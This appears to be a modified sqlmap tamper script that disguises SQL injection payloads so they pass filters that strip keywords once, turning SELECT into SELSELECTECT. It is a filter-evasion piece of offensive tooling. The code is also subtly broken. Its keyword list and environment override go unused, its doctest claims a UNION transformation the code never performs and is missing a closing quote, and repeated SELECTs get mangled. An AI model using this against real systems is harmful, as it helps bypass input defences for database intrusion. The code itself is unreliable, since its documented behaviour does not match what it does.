#!/usr/bin/env python

"""
Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

from re import finditer, search
from os import environ
from math import ceil, floor
from lib.core.compat import xrange
from lib.core.data import kb
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    Transforms keywords ('SELECT') so they are valid when stripped once ('SELSELECTECT')

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak filters based on keywords stripping.

    >>> tamper('SELECT id FROM users UNION SELECT NULL')
    'SELSELECTECT id FROM users UNUNIONION SELSELECTECT NULL
    """

    retVal = payload
    keywords = ['SELECT', 'UNION', 'WHERE', 'SUBSTR'];

    if 'UNSTRIP_KEYWORDS' in environ:
        keywords = environ['UNSTRIP_KEYWORDS'].upper().split(',')

    if payload:
        for match in finditer(r"\b[A-Za-z_]{2,}\b", retVal):
            word = match.group()

            if (word.upper() == 'SELECT' and search(r"(?i)[`\"'\[]%s[`\"'\]]" % word, retVal) is None):
                retVal = retVal.replace(word, word[:int(floor(len(word)/2))] + word + word[int(ceil(len(word)/2)):])

    return retVal
